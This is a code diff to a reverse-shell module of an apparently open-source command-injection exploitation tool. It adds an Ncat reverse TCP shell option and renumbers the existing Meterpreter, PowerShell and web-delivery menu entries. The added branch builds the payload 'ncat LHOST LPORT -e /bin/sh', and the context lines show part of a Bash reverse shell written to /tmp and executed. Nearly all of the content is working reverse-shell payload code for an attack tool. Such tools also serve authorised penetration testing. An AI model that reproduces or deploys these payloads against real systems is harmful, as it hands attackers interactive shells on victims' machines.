+++ src/core/shells/reverse_tcp.py
@@ -293,11 +293,12 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby revers
 Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
 Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat reverse TCP shell.
 Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Bash reverse TCP shell.
+Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Ncat reverse TCP shell.
 \n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
-Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
-Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
-Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use the web delivery script. 
+Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
+Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
+Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
+Type '""" + Style.BRIGHT + """11""" + Style.RESET_ALL + """' to use the web delivery script. 
 \ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
     
     # PHP-reverse-shell
@@ -353,8 +354,13 @@ Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use the web deli
                     " 1>%260 2>%260\" > /tmp/" + tmp_file + " " + separator + " /bin/bash /tmp/" + tmp_file
       break
 
-    # PHP-reverse-shell (meterpreter)
+    # Ncat-reverse-shell 
     elif other_shell == '7':
+      other_shell = "ncat " + settings.LHOST + " " + settings.LPORT + " -e /bin/sh"
+      break
+
+    # PHP-reverse-shell (meterpreter)
+    elif other_shell == '8':
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
         print settings.print_error_msg(error_msg)
@@ -397,7 +403,7 @@ Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use the web deli
       break
 
     # Python-reverse-shell (meterpreter)
-    elif other_shell == '8':
+    elif other_shell == '9':
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
@@ -442,7 +448,7 @@ Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use the web deli
       break
     
     # Powershell injection attacks
-    elif other_shell == '9':
+    elif other_shell == '10':
       if not settings.TARGET_OS == "win":
         windows_only_attack_vector()
         continue